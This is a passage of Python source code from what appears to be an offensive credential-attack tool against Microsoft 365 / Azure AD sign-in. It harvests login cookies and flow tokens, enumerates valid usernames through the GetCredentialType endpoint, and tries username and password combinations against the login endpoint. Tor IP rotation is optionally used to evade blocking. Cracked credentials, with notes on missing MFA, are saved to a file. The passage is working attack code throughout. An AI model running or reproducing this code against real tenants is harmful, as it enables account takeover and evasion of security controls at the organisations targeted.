                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_login}{RESET}")
                

            # Reques 2 a For getting two urls: (With-out Tor Proxy) :] 
            url_geturls = "https://www.office.com/login"
            headers_geturls = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
            try: 
                with httpx.Client(timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                    response_geturls = client.get(url_geturls)
                    location = response_geturls.headers.get("location")
                    if not location:
                        raise Exception("Redirect Location header not found")
                            
                url1 = location + "&sso_reload=true"
                url2 = location
                    
                cookie_header = ""
                for i in range(1, 20):  
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        ck = globals()[var_name]
                        cookie_header += f"{ck['name']}={ck['value']}; "
    
                cookie_header = cookie_header.strip().rstrip(";")
    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_geturls}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_geturls} {RESET}")
    
 
            # Reques 3 a For getting flowtoken parameter: (With-out Tor Proxy) :]
            headers_ulrs = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }
            try: 
                with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response2 = client.get(url1)
                    cookies_dict2 = dict(response2.cookies)
                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                        globals()[f"cookie_url1{i}"] = cookie2
                        #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")
    
                with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response3 = client.get(url2)
                    cookies_dict3 = dict(response3.cookies)
                    cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                    for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                        globals()[f"cookie_url2{i}"] = cookie3
                        #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")
    
                html = response2.text.replace("\\u0026", "&")
                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not match_reset:
                    raise Exception("Reset URL not found")
                        
                decoded_reset = unquote(match_reset.group())
                inner_url = decoded_reset.split("ru=", 1)[-1]
                parsed_inner = urlparse(inner_url)
                ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]
    
                match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                canary = match_canary.group(1) if match_canary else None
    
                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                flowtoken = match_flow.group(1) if match_flow else None
    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url1} and {url2}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                
                
            # Reques 4 Checking if user is exsit: (With-out Tor Proxy) :]
            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
            headers_UserExsit = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }
            payload_UserExsit = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }
                
            try: 
                if args.check:
                    try:
                        with httpx.Client(timeout=20, http2=True ) as client:
                            response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                            if '"FederationRedirectUrl"' in response_UserExsit.text:
                                print(f"{BOLD_YELLOW}[><] Can not enumeration if username is exist, login page is redirected to Federation Server {RESET}")
                                continue
                            if '"IfExistsResult":0' in response_UserExsit.text:
                                print(f"{BOLD_GREEN}[✓] Username: {username} is exists{RESET}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}\n")
                                continue
                            else:
                                print(f"{BOLD_RED}[✗] Username: {username} is not exists{RESET}")
                                continue
                                    
                    except httpx.ReadTimeout:
                        print(f"{BOLD_YELLOW}[!] Request timed out while checking user: {username}{RESET}")
                        continue
    
                    except httpx.RequestError as e:
                        print(f"{BOLD_YELLOW}[!] Request error for {username}: {e}{RESET}")
                        continue
            
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_UserExsit}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
            



if args.password:
    for username in usernames:
        for password in passwords:
            if args.proxytor and time.time() - last_ip_renewal >= renew_interval:
                renew_tor_ip()
                
                
                # Reques 1 a For getting cookies (With Tor Proxy) :]             
                url_login = "https://login.microsoftonline.com/"
                headers_login = {
                    "Host": "login.microsoftonline.com",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Sec-Purpose": "prefetch;prerender",
                    "Purpose": "prefetch",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i",
                }
                
                try:
                    with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                        response_login = client.get(url_login)
                        cookies_dict_login = dict(response_login.cookies)
                        cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
                        for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                            globals()[f"cookie_login{i}"] = cookie_login
                            #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")
    
                    for i in range(1, 5):
                        var_name = f"cookie_login{i}"
                        if var_name in globals():
                            cookie_login = globals()[var_name]
                        else:
                            print(f"{var_name}: not found")
    
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_login}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_login}{RESET}")
                

                # Reques 2 a For getting two urls: (With Tor Proxy) :] 
                url_geturls = "https://www.office.com/login"
                headers_geturls = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                }
                try: 
                    with httpx.Client(transport=transport, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                        response_geturls = client.get(url_geturls)
                        location = response_geturls.headers.get("location")
                        if not location:
                            raise Exception("Redirect Location header not found")
                            
                    url1 = location + "&sso_reload=true"
                    url2 = location
                    
                    cookie_header = ""
                    for i in range(1, 20):  
                        var_name = f"cookie_login{i}"
                        if var_name in globals():
                            ck = globals()[var_name]
                            cookie_header += f"{ck['name']}={ck['value']}; "
    
                    cookie_header = cookie_header.strip().rstrip(";")
    
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_geturls}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_geturls} {RESET}")
    
    
                # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]
                headers_ulrs = {
                    "Host": "login.microsoftonline.com",
                    "Cookie": cookie_header,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i"
                }
                try: 
                    with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                        response2 = client.get(url1)
                        cookies_dict2 = dict(response2.cookies)
                        cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                        for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                            globals()[f"cookie_url1{i}"] = cookie2
                            #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")
    
                    with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                        response3 = client.get(url2)
                        cookies_dict3 = dict(response3.cookies)
                        cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                        for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                            globals()[f"cookie_url2{i}"] = cookie3
                            #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")
    
                    html = response2.text.replace("\\u0026", "&")
                    match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                    if not match_reset:
                        raise Exception("Reset URL not found")
                        
                    decoded_reset = unquote(match_reset.group())
                    inner_url = decoded_reset.split("ru=", 1)[-1]
                    parsed_inner = urlparse(inner_url)
                    ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]
    
                    match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                    canary = match_canary.group(1) if match_canary else None
    
                    match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                    flowtoken = match_flow.group(1) if match_flow else None
    
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url1} and {url2}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                
                

                # Reques 4 Checking if user is exsit: (With Tor Proxy) :]
                url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
                headers_UserExsit = {
                    "Host": "login.microsoftonline.com",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Hpgid": "1104",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Hpgact": "1800",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Accept": "application/json",
                    "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Origin": "https://login.microsoftonline.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=1, i"
                }
                payload_UserExsit = {
                    "username": f"{username}",
                    "flowToken": f"{flowtoken}"
                }
                
                try: 
                    if args.check:
                        try:
                            with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                                response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                                if '"FederationRedirectUrl"' in response_UserExsit.text:
                                    print(f"{BOLD_YELLOW}[><] Can not enumeration if username is exist, login page is redirected to Federation Server {RESET}")
                                    continue
                                if '"IfExistsResult":0' in response_UserExsit.text:
                                    pass
                                else:
                                    print(f"{BOLD_RED}[✗] Username: {username} is not exists{RESET}")
                                    continue
                                    
                        except httpx.ReadTimeout:
                            print(f"{BOLD_YELLOW}[!] Request timed out while checking user: {username}{RESET}")
                            continue
    
                        except httpx.RequestError as e:
                            print(f"{BOLD_YELLOW}[!] Request error for {username}: {e}{RESET}")
                            continue
            
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_UserExsit}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                    
                
                # Reques 5 Dor checing Username with Password (With Tor Proxy) :]
                url_check_password = "https://login.microsoftonline.com/common/login"
                headers_check_password = {
                    "Host": "login.microsoftonline.com",
                    "Cache-Control": "max-age=0",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://login.microsoftonline.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Priority": "u=0, i",
                }
    
                cookies_string = f"""{cookie_url11['name']}={cookie_url11['value']}&AADSSO=NA|NoExtension&SSOCOOKIEPULLED=1&{cookie_url12['name']}={cookie_url12['value']}&{cookie_url13['name']}={cookie_url13['value']}&{cookie_url14['name']}={cookie_url14['value']}&{cookie_url15['name']}={cookie_url15['value']}&{cookie_url21['name']}={cookie_url21['value']}&MicrosoftApplicationsTelemetryDeviceId=31776052-89f1-4caf-82a2-4ccf2a9b7f37"""
                cookies_check_password = dict(cookie.split("=", 1) for cookie in cookies_string.split("&"))
    
                canary = quote_plus(f"{canary}")
                ctx = quote_plus(f"{ctx}")
                flowToken = quote_plus(f"{flowtoken}")
                
                data_check_password = f"""login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&canary={canary}&ctx={ctx}&flowToken={flowToken}"""  
                    
                
                try: 
                    try:
                        with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                            response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                            cookies_dict = dict(response_check_password.cookies)
                            pageid = get_pageid_from_response(response_check_password.text)
                            if args.check:
                                if "ESTSAUTHPERSISTENT" in cookies_dict:
                                    if pageid == "ConvergedProofUpRedirect":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}{RESET}{BOLD_YELLOW} - MFA required but not configured {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
                                        break
                                    elif pageid == "ConvergedTFA":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct - MFA required {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required \n")
                                        break
                                    else:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} \n")                                   
                                        break            
                                else:
                                    if pageid == "ConvergedChangePassword":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct{RESET}{BOLD_YELLOW} - A new password is required to be set.{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - new password is required \n")
                                        break
                                    elif "<html><head><title>Working...</title></head>" in response_check_password.text:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, but there is a redirect to federation server{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password}\n")
                                        break
                                    else:
                                        print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}\n")
                                        break
                                        
                            else :
                                if "ESTSAUTHPERSISTENT" in cookies_dict:
                                    if pageid == "ConvergedProofUpRedirect":
                                        print(f"{BOLD_GREEN}[✓] Seccessfully logged in with {username} and password: {password}{RESET} {BOLD_YELLOW} - MFA is required but not configured {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
                                        break
                                    elif pageid == "ConvergedTFA":
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, MFA is required {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - MFA required \n")
                                        break
                                    else:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} \n")                                   
                                        break                    
                                else:
                                    if pageid == "ConvergedChangePassword":
                                        print(f"{BOLD_GREEN}[✓]  User {username} is exist and Password {password} is correct{RESET}{BOLD_YELLOW} - A new password is required to be set.{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password} - new password is required \n")
                                        break
                                    elif "<html><head><title>Working...</title></head>" in response_check_password.text:
                                        print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, but there is a redirect to federation server{RESET}")
                                        with open("valid-users.txt", "a") as log_file:
                                            log_file.write(f"{username}:{password}\n")
                                        break
                                    else:
                                        print(f"{BOLD_RED}[✗] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   
    
                    except httpx.ReadTimeout:
                        print(f"{BOLD_YELLOW}[!] Request timed out while checking user: {username}{RESET}")
                        continue
    
                    except httpx.RequestError as e:
                        print(f"{BOLD_YELLOW}[!] Request error for {username}: {e}{RESET}")
                        continue
                   
                
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_check_password}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_check_password} {RESET}")
                
                
            else :
                #first action - login:
                
                url_login = "https://login.microsoftonline.com/"
                headers_login = {
                    "Host": "login.microsoftonline.com",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Sec-Purpose": "prefetch;prerender",
                    "Purpose": "prefetch",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i",
                }
                
                try:
                    with httpx.Client(timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                        response_login = client.get(url_login)
                        cookies_dict_login = dict(response_login.cookies)
                        cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
                        for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                            globals()[f"cookie_login{i}"] = cookie_login
                            #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")
    
                    for i in range(1, 5):
                        var_name = f"cookie_login{i}"
                        if var_name in globals():
                            cookie_login = globals()[var_name]
                        else:
                            print(f"{var_name}: not found")
    
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_login}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_login}{RESET}")
                
                
                #Sec action - Getting 2 urls:
    
                url_geturls = "https://www.office.com/login"
                headers_geturls = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                }
                try: 
                    with httpx.Client(timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                        response_geturls = client.get(url_geturls)
                        location = response_geturls.headers.get("location")
                        if not location:
                            raise Exception("Redirect Location header not found")
                            
                    url1 = location + "&sso_reload=true"
                    url2 = location
                    
                    cookie_header = ""
                    for i in range(1, 20):  
                        var_name = f"cookie_login{i}"
                        if var_name in globals():
                            ck = globals()[var_name]
                            cookie_header += f"{ck['name']}={ck['value']}; "
    
                    cookie_header = cookie_header.strip().rstrip(";")
    
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_geturls}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_geturls} {RESET}")
    
    
                #third action - Getting Cookies and Body Parametrs from url1+url2:
                headers_ulrs = {
                    "Host": "login.microsoftonline.com",
                    "Cookie": cookie_header,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i"
                }
                try: 
                    with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                        response2 = client.get(url1)
                        cookies_dict2 = dict(response2.cookies)
                        cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                        for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                            globals()[f"cookie_url1{i}"] = cookie2
                            #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")
    
                    with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                        response3 = client.get(url2)
                        cookies_dict3 = dict(response3.cookies)
                        cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                        for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                            globals()[f"cookie_url2{i}"] = cookie3
                            #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")
    
                    html = response2.text.replace("\\u0026", "&")
                    match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                    if not match_reset:
                        raise Exception("Reset URL not found")
                        
                    decoded_reset = unquote(match_reset.group())
                    inner_url = decoded_reset.split("ru=", 1)[-1]
                    parsed_inner = urlparse(inner_url)
                    ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]
    
                    match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                    canary = match_canary.group(1) if match_canary else None
    
                    match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                    flowtoken = match_flow.group(1) if match_flow else None
    
                except httpx.ReadTimeout:
                    print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url1} and {url2}{RESET}")
                except httpx.RequestError as e:
                    print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
                except Exception:
                    print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                
                
                #Check id User Exist:
                url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
                headers_UserExsit = {
                    "Host": "login.microsoftonline.com",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Hpgid": "1104",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "Hpgact": "1800",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Accept": "application/json",
                    "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Origin": "https://login.microsoftonline.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=1, i"
                }
                payload_UserExsit = {
                    "username": f"{username}",
                    "flowToken": f"{flowtoken}"
                }
                
                try: 
                    if args.check:
                        try:
                            with httpx.Client(timeout=20, http2=True ) as client:
                                response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                                if '"FederationRedirectUrl"' in response_UserExsit.text:
                                    print(f"{BOLD_YELLOW}[><] Can not enumeration if username is exist, login page is redirected to Federation Server {RESET}")
                                    continue
                                if '"IfExistsResult":0' in response_UserExsit.text:
                                    pass
                                else:
                                    print(f"{BOLD_RED}[✗] Username: {username} is not exists{RESET}")
                                    continue
                                    
                        except httpx.ReadTimeout:
                            print(f"{BOLD_YELLOW}[!] Request timed out while checking user: {username}{RESET}")
                            continue
    
                        except httpx.RequestError as e:
                            print(f"{BOLD_YELLOW}[!] Request error for {username}: {e}{RESET}")
                            continue
            
                except httpx.ReadTimeout:
